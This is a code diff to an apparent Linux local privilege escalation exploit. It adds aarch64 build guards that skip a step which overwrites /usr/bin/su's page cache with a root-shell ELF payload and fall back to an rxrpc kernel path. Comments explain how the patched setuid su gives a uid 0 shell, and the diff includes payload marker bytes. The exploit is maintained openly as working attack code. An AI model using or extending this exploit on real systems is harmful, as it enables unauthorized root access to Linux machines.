@@ -290,6 +290,11 @@ static int verify_byte(const char *path, off_t offset, uint8_t want)
 
 static int corrupt_su(void)
 {
+#if defined(__aarch64__)
+	SLOG("xfrm /usr/bin/su payload is x86_64-only; skipping on aarch64 and using rxrpc path");
+	errno = ENOTSUP;
+	return -1;
+#else
 	setup_userns_netns();
 	usleep(100 * 1000);
 
@@ -320,6 +325,7 @@ static int corrupt_su(void)
 	SLOG("wrote %d bytes to %s starting at 0x%x",
 			PAYLOAD_LEN, TARGET_PATH, PATCH_OFFSET);
 	return 0;
+#endif
 }
 
 int su_lpe_main(int argc, char **argv)
@@ -1641,7 +1647,9 @@ int rxrpc_lpe_main(int argc, char **argv)
  *
  * 1. ESP path  (authencesn AF_ALG --corrupt-only): overwrites the first
  *    160 bytes of /usr/bin/su's page-cache with a static x86_64 root-
- *    shell ELF.  Works on every distro tested regardless of PAM nullok
+ *    shell ELF. On aarch64 builds this step is skipped automatically and
+ *    the chain uses the rxrpc path directly. Works on every distro tested
+ *    regardless of PAM nullok
  *    or /etc/passwd contents — once invoked, the patched setuid-root
  *    /usr/bin/su just execs /bin/sh as uid 0.
  *
@@ -1690,7 +1698,12 @@ extern int rxrpc_lpe_main(int argc, char **argv);
  * magic there — both before and after we patch.)
  */
 static const uint8_t su_marker[8] = {
+#if defined(__aarch64__)
+	/* No aarch64 /usr/bin/su patch payload yet; keep a marker that never matches. */
+	0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+#else
 	0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a,
+#endif
 };
 
 static int su_already_patched(void)
